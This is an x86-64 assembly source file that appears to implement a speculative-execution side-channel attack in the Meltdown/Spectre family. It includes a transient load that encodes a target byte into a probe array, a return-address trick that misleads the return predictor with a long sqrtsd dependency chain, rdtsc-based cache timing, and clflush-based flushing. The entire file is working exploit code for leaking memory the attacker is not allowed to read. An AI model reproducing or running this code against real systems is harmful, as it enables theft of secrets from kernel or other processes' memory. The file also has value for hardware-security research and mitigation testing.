.code 

LoadProbe proc	; rcx - targer, rdx - probe array

	call DoWork
	; rcx - target addres, rdx - probe
retry:
	; these instructions executes speculatively at the same time as sqrtpd in DoWork
	mov al, [rcx]
	shl rax, 0Bh
	mov r11d, [rdx + rax]
	je retry
	lea rdx, [rdx + rax]	; spend 1 clock to this op, saves 1 clock per iteration in loop
	; the more reads, the more likely cache line will remain in the cache
load_again:
	mov r11d, [rdx]
	jmp load_again

LoadProbe endp

DoWork proc
	;PREFETCHT0 [rcx]					; prefetch target data, no any effect on Kaby Lake
	mov r10, HookRet - 1
  ;mov r11d, 4

	; long depency chain on instruction flow
	mov r9d, 2
	cvtsi2sd xmm0, r9d
	
; Aim: make reorder buffer fills fast, execute chain long, but as little port occupancy as possible, especially load,shit,branch ports

	; loop makes uOps come from loop back buffer/uOps cache, not from slow decoder
	; but it's trade-off between decoding speed and dec/je pollution in |execution port/reoder buffer/reservation station|
	; loop with 1 sqrtsd produce many dec/je uOps (since I think Sandy Bridge dec/jne is marco fused)
	; so this loop can be fully unrolled (use 4 or 16 bytes alignment to faster prefetching)
chain_loop: 
	dd 40 dup (0C0510FF2h)	; sqrtsd xmm0, xmm0   ; have 18 clocks latecncy on Kaby/Sky Lake, 4 intruction pre clock can be decoded on most CPUs
  ;dec r11d					; may be better use old e-regesters to avoid using REX prefix
  ;jne chain_loop
	cvtsd2si r9, xmm0
	add r9, r10
	xor rax, rax
	
	;mov qword ptr [rsp], r10
	mov qword ptr [rsp], r9			; trick return predictor, works very easy and relaible unlike trying to trick branch predictor

	; CPU can't check real return address until finish previus instructions chain, so it will predict return address using return stack
	ret								; CPU instruction flow is going to 'retry' label

DoWork endp


HookRet proc
	ret
HookRet endp

MeasureMem proc
	;mov r10, rbx
	mov r9, rcx
	;xor eax, eax
	;cpuid
	rdtsc
	mov r8d, eax

	; non temporal read means data must be no loads into cache (in practice it's not, atleast for Kaby Lake)
	;movntdqa xmm0, xmmword ptr[r9]
	;movd eax, xmm0
	mov rax, [r9]

	;xor eax, eax
	;cpuid
	rdtscp
	sub eax, r8d
	;mov rbx, r10

	ret

MeasureMem endp


FlushMemAsm proc	; rcx - mem*, rdx mem size, r8 - to replace*, r9 - to replace size
	
	xor r11, r11
flush_loop:
	clflush [rcx + r11]
	;mov r10, [r8 + r11]
	add r11, 8
	cmp r11, rdx
	jle flush_loop

	replace_loop:
	;mov r10, [r8 + r11]
	;add r11, 8
	;cmp r11, rdx
	;jle replace_loop

	ret

FlushMemAsm endp

end